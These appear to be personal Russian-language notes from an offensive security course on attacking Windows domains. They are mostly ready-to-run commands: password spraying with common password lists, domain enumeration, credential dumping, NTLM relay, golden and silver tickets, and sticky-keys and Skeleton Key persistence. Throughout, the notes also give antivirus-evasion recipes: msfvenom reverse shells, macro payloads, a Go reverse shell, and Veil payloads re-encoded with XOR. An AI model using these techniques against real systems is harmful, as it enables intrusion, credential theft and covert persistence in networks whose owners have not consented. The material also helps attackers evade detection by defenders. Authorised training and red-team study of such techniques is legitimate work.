https://github.com/rasta-mouse/Sherlock
https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194
https://pentestlab.blog/tag/local-exploits/ 



Атаки на домен

msf6> use auxiliary/scanner/smb/pipe_auditor				Чекаем все пайпы


PIPE Samr
Только воткнушвись в сеть сразу можем узнать список пользователей

Сработает только с анонимным доступом к pipe samr
msf6> use auxiliary/scanner/smb/pipe_auditor

$ sudo rpcclient -N 192.168.1.65 -U "" 
rpcclient $> enumdomusers						

https://github.com/m8r0w/nulliux
$ python nullinux.py 192.168.1.65

$ eum4linux 192.168.1.60 -U
Если 
[+] Password Info for Domain:
	..
	[+] Account Lockout Threshhold: <None>/<5>		Смотрим, стоит ли ограничение на число неудачных попыток входа
	[+] Reset Account Lockout Counter: <30>/<Never>		Время до сброса числа неудачных входов	(Never - очень опасно)				



Password spraying (95%)
Идем с одним паролем сразу на все учетки

Vfhn2021		На раскладке Март2021 (Берем последне 2-3 месяца)
Vfhn2021!		Такая же логика
Atdhfkm2021
Atdhfkm2021!
P@ssw0rd		Часто всречается		
P@ssw0rd1
Aa12345678		Очень частый пароль
1qaz@WSX		Частый геометрический пароль  
!QAZ2wsx

Идем на любую доменную машину
$ crackmapexec smb <ip> -u <словарь с логинами> -p <P@ssw0rd@1> <!QAZ2wsx> --continue-on-success

$ hydra -L <user.txt> -p Password@1 <id> smb		Но, в отличии от прошлого варианта, не отображает, что учетки начали лочиться

msf6> smb/smb_login
	set rhost <ip>					Ставим олько один адрес, иначе залочим домен
	set user_file <user.txt>
	set pass_file <pass.txt>
	set SMBDomain			

$ patator smb_login host=<ip> user=FILE0 0=<file> password=Password@1

Пароль доменного администратора (RID=500) никогда не лочится => брутаем сколько хотим



ADModule
https://github.com/samratashok/ADModule
C:\> powershell -nop -exec bypas
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Managemet.dll -Verbose
PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.ps d1
PS C:\> Get-Command -Module ActiveDirectory
PS C:\> Get-ADDomain					Получить данные о текущем домене
PS C:\> Get-ADDomain -Identity 				Получить данные о конкреном домене
PS C:\> (Get-ADDomain).DomainSID			Получить SID домена

PowerView
https://github.com/PowerShellMafia/PowerSploit
C:\PowerSploit-3.0.0\Recon> powershell -nop -exec bypas
C:\> runas /noprofile /netonly /user:<deligatio.local\IvanovSR> "powershell -nop -exec bypass"	Запускаем от имени взломанного пользователя
PS C:\> Import-Module PowerView.ps1
PS C:\> Get-NetDomain					Получить данные о текущем домене
PS C:\> Get-NetDomain -Domain <domain.local>		Получить данные о конкреном домене
PS C:\> Get-DomainSID					Получить SID домена
PS C:\> Get-NetUser					Позволяет вытащить samaccountname
PS C:\> Get-NetGroup <group> -Recurse			Рекурсивно проходим по группам в случае, если есть вложенныые группы
PS C:\> Get-NetLoggedon -ComputerName ps-dima		Пользователи, залогиненные на выбраном компьютере
PS C:\> Get-NetComputer -FullData			Информация о компьютере
PS C:\> Find-LocalAdminAccess -Verbose			Узнать, куда подойдет учетка, от которой запущен PS
PS C:\> Get-NetProcess -ComputerName 			Узнать запущенные процессы (тупой юзер не станет запускать putty)

Реально полезная команда
PS C:\> Invoke-UserHunter -UserName <username>		Ищем все мавшины, на которых сидит пользователь				

Это позволяет узнать диапазоны адресов, в которых есть домен контроллеры, и следовательно, которые нужно просканировать



CRTP - индусский курс по powershell. Есть много сливов в телеге
на pentester academy



EMPIRE позволяет управлять ботнетами через Comand&Controll
wc -l <file>		Подсчитать кол-во строк в файле
В Винде с строке с путем, если заменить все на CMD, то откроется консоль в текущей директории





Занятие 9

Bloodhound (Linux Domain enumeration)
https://github.com/BloodHoundAD/BloodHound
в репозитории лежат Collectors, их нужно регулярно скачивать заново

Default  	local admins on machines, group members, domain trusts, sessions
Group  		group members
LocalGroup  	local admins
GPOLocalGroup 	local admins через GPO
ComputerOnly  	local admin, session
Sessions  	user sessioin
LoggedOn  	залогненные пользователи
Trust		domainn trusts для определенных доменов
ACL		ACL с домена
Container	информация о контейнерах
All		все вышеперечисленное

Collectors для bloodhound необходимо скачивать заново (часто обновляются)

Рекомендованный коллектор SharpHound.exe
Invoke-Bloodhound -CollectionMethod Group,Trusts,ACL,ObjectProps,Container,GPOLocalGroup -Threads 25
Invoke-loodHound -CollectionMethodSession -Threads25
Invoke-Bloodhound -CollectionMethodRDP,LocalGroup -Threads25

Можно загрузить exe-шник на пробитую машину и запустить команду
SharpHound.exe -c Container,Group,OjectProps,ACL,Trusts,DCOnly,GPOLocalGroup --excludedomaincontrollers

Полученные архивы кидаем в главное окно bloodhound

Node Info
Информация о связях

Analysis (Queries)
Можно найти кратчайшее расстояние до Domain Admin
или выполниить другие полезные действия

Если нажать ПКМ на название связи между нодами и перейти во вкладку abuse, можно найти гайд по взлому

Доп материалы BloodHound
1. Custom Queries (запросы для получения кратчайшего путии к админу и т п)
https://github.com/seajaysec/c7f0995b5a6a2d30515accde8513f77d
2. ПО для выгрузки/загрузки owned объектов
https://github.com/porterhau5/BloodHound-Owned
3. Custom Queries для вызова напрямую из bloodhound
https://github.com/porterhau5/BloodHound-Owned/blob/master/customqueries.json

Реальный пример
1. $ docker run --publish=7474:7474 --pulish=7687:7687 --volume=$HOME/neo4j/data:/data neo4j
2. http://localhost:7474
3. меняем пароль (дефолт neo4j:neo4j)
4. $ bloodhound
5. вводим данные базы
6. качаем Collectors
7. пробиваем машину, делаем хешдамп, подбираем куда подойдет
8. meterpreter> upload SharpHound.exe
9. SharpHound.exe -c Container,Group,OjectProps,ACL,Trusts,DCOnly,GPOLocalGroup --excludedomaincontrollers
10. meterpreter> download 2020_BloodHound.zip
11. перетаскиваем в bloodhound



ADIDNSDump
Domain Enumeration при помощи Linux

https://github.com/dirkjanm/adidnsdump
$ adidnsdump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65
$ cat records.csv



Ldapdomaindump		
Собирает информацию о домене и представляет ее в красивом виде

https://github.com/dirkjanm/ldapdomaindump
$ python3 setup.py install
$ ldapdomaindump -u deligation.local\\Administrator -p 1qaz@WSX 192.168.1.65 -o .



ldapsearch
$ ldapsearch -E pr=1000/noprompt -LLL -x ldap://10.64.196.11 -D "user@domain.local" -w password -b dc=domain,dc=com '(&(objectCategory=person)(ojectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' sAMAccountName | grep sAMAccountName | cut -d: -f2-
Найти только enable учетки (удобно для password spraying)



windapsearch
https://githu.com/ropnop/windapsearch
$ sudo apt-get install python3-ldap
$ sudo python3 windapsearch.py
--da 			domain admins
-PU			привилегированные пользователи
--admin-ojects		пользователи, которые скорее всего имеют права админа (по косвенным признакам)
--user-spns		пользователи, подверженные kerberoastinng



Crack Map Exec
https://github.com/byt3bl33d3r/CrackMapExec
$ sudo apt-get install -y libssl-dev libffi-dev python-dev build-essential	зависимости
--local-auth		если идем на локальную учетку (по умолчанию идем на доменную)
-H <hahs>		атака pass the hash
-x "<ipconfig>"		выполнить командуна хосте (нужно запускать с sudo)
-L 			список модулей
-M 			использовать модуль
(Pwn3d!)		юзер является локальным админом

Наборы флагов
Выполнение кода
$ sudo cme smb 192.168.1.11 -u Administrator -p "P@ssw0rd" -x "whoami"
Шары, хеши, сессиии, lsasecrets, залогиненные юзеры
$ sudo cme smb 192.168.1.11 -u Administrator -p "P@ssw0rd" --local-auth --sam --lsa --shares --ntds --sessions --loggedon-users
Модули:
	enum_chrome			пароли из хрома
	get_netdomaincontroller		список домен-контроллеров
	get_netrdpsession		активные RDP сессии
	gpp_password			полезная инфа + пароли в чистом виде из GPP
	invoke_sessiongopher		вытаскиваем сессии из PuTTY WinSCP FileZilla RDP. Очень полезно, ноп алится, лучше использовать оттдельной утилитой


post/widows/gather/credetials/gpp

Михаил Нащекин (Mikhail Naschekin) - работает в positive technologies





Занятие 10

Antivirus Bypass

Bind - пробили и открыл порты
Reverse - жертва коннектится к нам 



Reverse shell (Standard)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<ip> lport=<11337> -f exe -o reverse_tcp.exe
msf6> use exploit/multi/handler

Reverse shell (Stageless более скрытный от антивирусов)
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<ip> lport=<11337> -f exe -o ncshell.exe
$ nc -nvlp 11337



Payload через макросы
$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f vba
Документ -> Macro -> create
msf6> use exploit/multi/handler

Если все еще палится, ищем vba обфускаторы и используем их



Просмотр рабочего стола по vnc
$ msfvenom -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -o vnc.exe



Генерируем сервисный exe (предположим, он не детектится антивирусом)
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="ip" LPORT="port" -f exe-service -o meter_service.exe
Выполняем psexec с кастомным exe файлом
msf6> use windows/sbm/psexec
msg6> set exe::custom meter_service.exe
Ставим в названия и в описание сервиса мусор, что бы не было детекта по этим полям
msf6> set SERVICE_<NAME, DESCRIPTION, DISPLAY_NAME> blablabla



Энкодеры для нагрузки
$ msfvenom --list encoders			Список енкодеров
$ msfvenom -i <55>				Кол-во иттераций енкодера
-e <x86/x64>/shikata_ga_nai			Один из популярных энкодеров для обхода антивирусников 
-e x86/alpha_upper
-e x86/jmp_call_additive

Энкодеры нужны не только для маскировки, но и для более стабльного запуска бинарных файлов (обход "плохих" символов)



Закодированный vnc шелл (не сильно помогает)
msfvenom> -p windows/vncinject/reverse_tcp lhost=<ip> lport=<port> -f exe -e x86/shikata_ga_nai -o encmalware.exe



##### НЕ БЫТЬ ВИРУСОМ #####
В Kali есть легитимные виндовые бинарники
/usr/share/windows-resources/binaries/
nc.exe		
plink.exe		аналог ssh
wget.exe



"скрытый" Reverse Shell

1. Копируем бинарник
$ cp /usr/share/windows-resources/binaries/nc.exe .
2. Поднимаем шару (если Errno 98 $sudo lsof -i :445; $ sudo kill <PID>)
$ sudo impacket/examples/smbserver.py kek . -smb2support
3. Поднимаем лисенер
$ nc -nvlp <lport>
4. Записываем в .bat и отдаем жертве на запуск
%COMSPEC% /b /c start /b /min \\<share ip>\kek\nc.exe <lhost> <lport> -e cmd.exe

Побочные эффекты:
*Запуск затрудняет Windows Defender (запустить в любом случае)
*При запуске открывается консоль на весь экран (сделать ее скрытой) 
*Предупреждение от Kaspersky об обнаружени программы для удаленного адмиинистррования
Тем не менее, после прохожденя первого шага шелл не упадет автоматически


Если есть учетная запись, можем сами выполнить команду за жертву
$ impacket/examples/wmiexec.py -h ./Admin:Pa$$w0rd@<RHOST> '\\<LHOST>\kek\nc.exe <LHOST> <LPORT> -e cmd.exe'


Утилита для подключения (PowerShell реализаця nc) Bind Shell
https://github.com/besimorhino/powercat
На жертве
PS C:\> Invoke-PowerShellTcp -Bind -Port 4444
На своей винде
PS C:\> powercat -с <RHOST> -v -p <RPORT>

*Касперский спалил powercat


Powershell обфускация (новые появляются постоянно, проще загуглить)
"powershell obfuscator site:github.com" + фильтр 'За месяц'
Если использовать несколько разных обфускаторов, то надежность больше
Так же можно заворачвать mimikatz
https://github.com/danielbohannon/Invoke-Obfuscation
https://github.com/CBHue/PyFuscation
https://github.com/cwolff411/powerob
https://github.com/TheEyeOfCyber/FernHunt_WindowsPowershell-Obfuscator
https://github.com/the-xentropy/xencrypt



##### БЫТЬ НЕОЖИДАННЫМ #####
Используем редкие языки

<скрипт из презентации на GO>
package main
import ("bufio"
	"fmt"
	"net"
	"os/exec"
	"strings")
func main() {
	conn, _ := net.Dial("tcp", "<10.1.75.200>:<8081>")
	for { message, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
		if err != nil { fmt.Fprintf(conn, "%s\n",err) }
		fmt.Fprintf(conn, "%s\n",out)}}
	
Компиляция
$ env GOOS=windows GOARCH=386 go build rev.go

Действительно работает!
* Не все команды получается выполнить
* Вероятно, шелл не интерактивный
* Это просто Proof Of Concept



Veil 
https://github.com/Veil-Framework/Veil-Evasion
cd Veil-Evasion
cd setup
setup.sh -c

OR 
docker run -it -v /tmp/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil

Получаем перекодированную нагрузку, которая не будет палиться
1. Сгенерировав нагрузку (см 2:40:00), нас интересует исходник 
[*] Source code written to: <file>
2. Берем 3-ю строку 	
UIMaArEiYYfHs = base64.b64decode("/OiGAAAAYInlMdJki1Iwi1IM.../9UBwynGhfZ17MM=")
3. Через питон прогоняем ее через XOR 123
$ python2
>>> ''.join([chr(ord(e)^123) for e in "/OiGAAA...17MM".decode("base64")]).encode("base64").replace('\n','')
'/Lb5hdReyLNB0o5...6uFK9='
4. Вставляем новую строку вместо старой в исходник с обратным алгоритмом
UIMaArEiYYfHs = ''.join([char(ord(e)^123) for e in "/Lb5hdReyLNB0o5...6uFK9=".decode("base64")])
5. Собираем из исходника питона .exe
$ docker run -v /home/<kali>:/src/ cdrx/pyinstaller-windows:python2 pyinstaller --onefile <meter_veil.py>

*По хорошему, надо бы написать автоматизацию =)



Можно купить лицензию VMProtect (защищает продукт от антивирусов), но блэчить не получится. Стоит около 1000$ в год


find . -name *.bat





Занятие 11

Линукс может быть интегрирован в домен 
Линукс знает, как работать с доменом, но домен не умеет работать с линуксом
К примеру, можно сделать авториизацию на шарах по керберосу, но нельзя раскатать политики на линукс
Но при компрометации домен-контроллера, скомпрометровать линукс машину будет сложно



NTLM Relay

Обращение по: 
ip адресам - NTLM
Доменным именам - Kerberos

NTLM
1. Negotiate
2. Challenge
3. Authenticate

Mic - часть Negotiate, отвечающая на защищенность передаваемых данных
Удалив mic можно

Теория
1. Атакующий встает посередине между клиентом и сервером
2. Клиент хочет авторизоваться на <почтовом> сервере и отправляет Negotiate
3. Атакующий перенаправляет Negotiate на интересующий его <БД> сервер
4. Сервер посылает Challenge атакующему
5. Атакующий перенаправляет Challenge клиенту
6. Клиент отправляет Authenticate 
7. Атакующий перенаправляет Authenticate серверу
8. Сервер разрешает аутентфкацю атакующему от лица клиента
9. Атакующий заходит на сервер и говорит клиенту, что авторизация провалена
10. Клиент пробует с первого шага несколько раз и любезно сливает нам еще около 5 соединений



Атака
1. $ crackmpexec smb 192.168.1.0/24					Ищем цели с signing:False
В среднем можно выбрать до 5 целей за раз
2. $ сrackmapexec smb <192.168.1.0>/24 --gen-relay-list targets.txt	
Создаем список из клиента и пачки сочных серверов, на которых хотим авторизоваться. (Лишние удаляем из файла)
3. Отключаем SMB и HTTP в конфиге responder
/etc/Responder/Responder.conf
	SMB = Off
	HTTP = Off
4. $ responder -I eth0 -r -d -w					
5. $ sudo ntlmrelayx.py -tf targets.txt -c "ipconfig"			Вместо ipconfig можно вставть msfvenom (пейлоад одной строкой)



Будучи никем получаем доменную учетку
По умолчаню каждый пользователь домена имеет возмолжность ввести 10 новых пользователей
$ sudo ntlmrelayx.py -t ldaps://<dc-ip> --no-dump --no-da --no-acl --no-validate-privs --add-computer <pentest> 



Printer Bug
https://github.com/girkjanm/krbrelayx/printerbug.py
По дефолту на любой машине есть сервис печати (spool service). 
С любой машины можно отправить запрос на печать
Можно заставить любую машину сходить к нам на SMB и аутентифицировать на нашей шаре машнную учетную запись
1. Включаем SMB и HTTP в конфиге Responder
2. $ ntlmrelayx.py -t smb://<ip цели> -smb2support
3. $ python3 printerbug.py <Doamin.local>/<машинная учетка>\$@<ip цели> --hashes <NTLM Hash> <наш ip>



ZeroLogon (безопасная версия, в отлчии от опасных эксплойтов с гитхаба)
$ ntlmrelay.py -t DCSYNC://DC01.mic.local -smb2support





Занятие 12

с доменной учеткой можно делать керберостинг, асрепростинг, ремов мик,

Сканируем максимально широко!

План
1. Wireshark
2. Сканирование
3. Пробив
4. Сбор loot (повышение)
5. Достижение цели



Достижение цели

Ищем машины с двумя интерфейсами (возможно они ведут в закрытые сегмены)
$ crackmapexec smb <192.168.1.0>/24 -u Administrator -H <hash> -x "ipconfig"
$ crackmapexec smb <192.168.1.0>/24 -u Administrator -H <hash> -x "netstat -ano | findstr 192.168.1.0"



Обход сегментации сети

Gost
https://github.com/ginuerzh/gost
https://docs.ginuerzh.xyz/gost/en/	Wiki

Атака
На жертве
C:\> gost.exe -L socks5://:8081
На kali
$ ./gost -L socks5://:8080 -F socks5://192.168.1.1:8081

Запускаем msf через прокси
msf6> set proxies socks5://192.168.1.1:8080

Более длинная цепочка
gost -L=socks5://:8080 -F=socks5://192.168.1.1:8081 -F=socks5://192.168.1.2:8082 -F=socks5://192.168.1.3:8083 



Реальный сценарий 
reverse proxy, что бы обойти нат и фаерволл

На сервере с белым IP (195.230.102.1)
$ gost -L socks5://0.0.0.0:1337

На таргет сервере
$ ./gost -L socks5://127.0.0.1:13338 &
$ ./gost -L rtcp://0.0.0.0:13381/127.0.0.1:13338 -F socks5://<195.230.102.1>:1337 &
В proxychains
socks5 127.0.0.1 13381

Port forwarding
gost -L=tcp://:2222/192.168.1.1:22



Proxychains
https://github.com/haad/proxychains

Отключаем уведомленя от proxychains
$ proxychains <msfconsole> 2>/dev/null



Tsocks (Мастхев при сканировании, но не очень стабильный)
Конфиг - /etc/tsocks.conf
$ export LD_PRELOAD=libtsocks.so; nmap 192.168.1.1 -sT 	Опция sT нужна что бы работать через прокси



Доп материалы по пивотингу
https://book.hacktricks.xyz/tunneling-and-port-forwarding
https://www.radarhack.com/tutorial/DEFEATING_THE_NETWORK_SECURITY_INFRASTRUCTURE.pdf

Port forward over SOCKS4:
127.0.0.1:3389 -> 192.168.1.100:3389 over socks 127.0.0.1:9999

socat TCP4-LISTEN:3389, fork (можно повесить stdin stdout прложения на порт)
SOCKS4:127.0.0.1:192.168.1.100:3389, socksport=9999



Прокси через ssh
1. Подключаемся к хосту по ssh с -D
$ ssh user@192.168.1.1 -D <31337>
2. Добавляем в /etc/proxychains4.conf
	socks5 127.0.0.1 <31337>
3. Выполняем команды через прокси
$ proxychains <command>



SCCM
https://github.com/PowerShellMafia/PowerSCCM
https://www.youtube.com/watch?v=-ZlQKyh0EGs

 

ZABBIX
Система мониторинга 
можно исполнять код на машинах (любые архитектуры)
https://www.youtube.com/watch?v=Vw_AvSlB7f0



RULER
Работает с Exchange (Outlook)
Получаем доступ на машину из изолированного сегмента, если мы скомпрометировали его учетку
https://github.com/sensepost/ruler
https://www.youtube.com/watch?v=C07GS4M8BZk

Основные команды:
display - перечислить все текущиие правила
add	- добавить правило
delete	- удалить правило
brute	- брут учетных данных
send	- отправить имейл для запуска шелла
abk 	- взаимодействе с GAL
form	- выполнение сценария с помощью пользовательских форм
help	- экран помощи


mail.ruler.local
$ ./ruler -k --verbose \
--email i.ivanov@ruler.local \
--username i.ivanov \
--hash 7395bbfcb39adb3ca48c54663201266f \
add \
--location '\\198.18.245.13\kek\meter.exe' \
--trigger "kekpek4" \
--name maliciousrule4 \
--send --subject kekpek4

$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=198.18.245.13 LPORT=4567 -f exe -o meter.exe
$ sudo smbserver.py kek . -smb2support



Проверяем доменные учетки
$ crackmapexec smb <any domain machine> -u <uname> -H <hash>
$ crackmapexec smb <any domain machine>/24 -u <uname> -H <hash>



Атаки на GPO
auxiliary/scanner/smb/smb_enum_gpp
нужно скормить любую доменную учетку

post/windows/gather/credentials/gpp

Через модули cme
$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_autologon
$ cme smb 192.168.1.2 -u Administrator -H <hash> -M gpp_password



Директория, в которую могут писть все (В реальной среде это будет нашей рабочей папкой)
C:\Users\Public





Занятие 13

Redteaming не может быть без Blueteam

Purple Team - следит за ходом и дает подсказуи отстающей команде

Задача Red Team - не спалиться синим

Если понимаешь "Ага, тут я мог спалится", то лучше отвлечь внимаение ложным следом

Сценарий:
звоним в техподдержку, представляемся топ менеджером и нагнетаем остановку. Сводм к "сбросте мне пароль"

Интерфейс кали можно сделать пожожим на Windows 10
$ kali-undercover



Golden Ticket (not ReadTeam)
Нельзя использовать ntlm хеш при генераци ключа (только есл заказчик не использует des у себя)
mimikatz # kerbberos::golden /user:evil /domain:<petest.local /sid:<S-1-5-21...> /krbtgt:<d125e4f69ec95...> /ticket:evil.tck /ptt
$ python ticketer.py -nthash <b8aa706788a...> -domain-sid S-1-5-21...> -domain PENTEST.local administrator



Golden Ticket 
mimikatz # lsadump::dcsync /domain:rd.adsecurity.org /user:Administrator
mimikatz # kereros::golden /domain:la.ropnop.com /sid:<S-1-5-21...> /aes256:<abb8e586f33...> /user:mini /target:<ws03win10.lab.ropnop.com> /service:cifs
$ ./secretsdump_linux_x86_64 -just-dc-user <wmuser> LA/agreen@pdc01.lab.ropnop.com
$ ./ticketer_linux_x86_64 -aesKey <5d87354235aadfc...> -domain-sid <S-1-5-21...> -domain la.ropnop.com -duration 1 HelloThere



Silver Ticket
$ ./ticketer_linux_x86_64 -aesKey <224351fcd4447...> -domain-sid <S-1-5-21...> -domain lab.ropnop.com -spn cifs/<ws03win10.lab.ropnop.com> SilverHelloThere



DCsync
Avoid suspicious logs
C:\> Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domai:dollarcorp.money.local /sid:<S-1-5-21-2578...>,<S-1-5-9> /krbtgt:<ff46a98d66c...> /ppt"'
C:\> Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'
S-1-5-21-2578...	Domain Controllers
S-1-5-9		Enterprise Domain Controllers



Сканировать nmap и masscan плохо (легко детектится)
В крайнем случае сканим один-два порта и максимально тихо

Вместо этого используем LDAP 

Запросы к неживым машинам палятся

Обычно IDS IPS стоят только на доменных машинах, при этом недоменные машины чаще не защищены

Компрометация админ панели VMWare позволяет получить доступ к trunk порту и после скакать по vlan-ам

C:\> takeown /f <file>



Digispark 
Микроконтроллер, bad usb
Павел хорошо в этом разбирается, стоит поиграться с этим 



Persistent sticky keys
Консоль с правам системы при залипании клавиш (Палится Deffender, Kasperskiy и т.п.)
C:\> REG ADD "HKLM\SOFTWARE\Microsoft\Windows\WindowsNT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t
C:\> REG_SZ /d "C:\windows\system32\cmd.exe"

Из заметок Павла
C:\> cd \
C:\> cd windows\system32
C:\> icalcs C:\windows\system32\sethc.exe /save C:\windows\system32\sethc.ACLFile /T
C:\> takeown /f sethc.exe
C:\> icacls sethc.exe /grant administrators:f
C:\> icacls C:\windows\system32\cmd.exe /save C:\windows\system32\cmd.ACLFile /T
C:\> takeown /f cmd.exe
C:\> icacls cmd.exe /grant administrators:f
C:\> echo yes | copy C:\windows\system32\sethc.exe C:\windows\system32\sethcexe.BAK
C:\> echo yes | copy C:\windows\system32\cmd.exe C:\windows\system32\sethc.exe

msf6> search sticky_keys




Угон RDP сессии
C:\> quser			Просмореть список акивных RDP сессий
C:\> query user		Или так
C:\> tscon <id>		Угоняем активную сессию



Pentecter Academy
GCB 
Очень хороший и сложный стенд по доменам



DSRM 
на домен контролерах есть ненужный аккаунт локального админа
C:\> HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonehavior
	0 (default) Account can e used only when DC is in DSRM
	1 Account can be used when local AD DS service is stopped
	2 Account can e used always
Меняем пароль с помощью NTDSUtil



Создать пользователя, который может менять пароли ВСЕМ, при этом не являясь админом
C:\> Get-ADUser <username> | Set-ADObject -Clear adminCount
C:\> Get-ADUser <username> | Set-ADObject -Add @{adminCount=1}
Атака сложная, нужно дополнительно изучить



Skeleton Key 
Добавляем второй пароль, не нарушая работу старого. Нужно сделать на всех контроллерах домена, сбрасывается при перезагрузке, хорошо работает только на 2008 сервере
# mimikatz.exe
# privilege::debug
# misc::skeleton
C:\> net use x: \\dc-01\admin$ /user:jeff mimikatz	Входим по керберосу на учетку с паролем mimikatz, при этом старые парлоли будут работать



##### Набор материала по закреплению на винде #####
https://github.com/infosecn1nja/AD-Attack-Defence/blob/master/README.md#persistence



youtube.com  лука сафонов 2 лекции по АД 

Книга Windows Internals обязательно прочитать!
22:03 23.04.2021
